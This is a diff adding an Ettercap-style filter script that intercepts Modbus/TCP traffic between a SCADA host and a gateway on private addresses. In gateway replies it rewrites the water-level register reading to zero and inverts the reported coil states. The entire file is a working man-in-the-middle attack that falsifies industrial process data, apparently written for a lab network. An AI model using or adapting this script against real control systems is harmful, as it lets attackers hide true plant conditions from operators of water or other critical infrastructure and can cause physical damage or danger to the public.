@@ -1,0 +1,41 @@
+if (ip.proto == TCP && tcp.dst == 502) {
+  if (ip.src == '192.168.60.10' && ip.dst == '192.168.65.10') {
+    msg("Found Modbus packet from scada to gateway");
+  }
+}
+
+if (ip.proto == TCP && tcp.src == 502) {
+  if (ip.src == '192.168.65.10' && ip.dst == '192.168.60.10') {
+    msg("Found Modbus packet from gateway to scada");
+    
+    # edit the water level to be 0
+    if (search(DATA.data, "\x00\x05\x01\x04\x02")) {
+      msg("found modbus read input registers reply packet");
+      #log(DATA.data, "/tmp/logfile.log");
+      DATA.data + 9 = 0x00;
+      DATA.data + 10 = 0x00;
+    }
+    
+    # edit coils value to be opposite to what they actually are
+    if (search(DATA.data, "\x00\x04\x01\x01\x01")) {
+      msg("found modbus read coils reply packet");
+      if (DATA.data+9 == 0x00) {
+        DATA.data + 9 = 0x03;
+      }
+      else {
+        if (DATA.data+9 == 0x03) {
+          DATA.data + 9 = 0x00;
+        }
+      }
+      if (DATA.data+9 == 0x01) {
+        DATA.data + 9 = 0x02;
+      }
+      else {
+        if (DATA.data+9 == 0x02) {
+          DATA.data + 9 = 0x01;
+        }
+      }      
+    }
+  }
+}
+
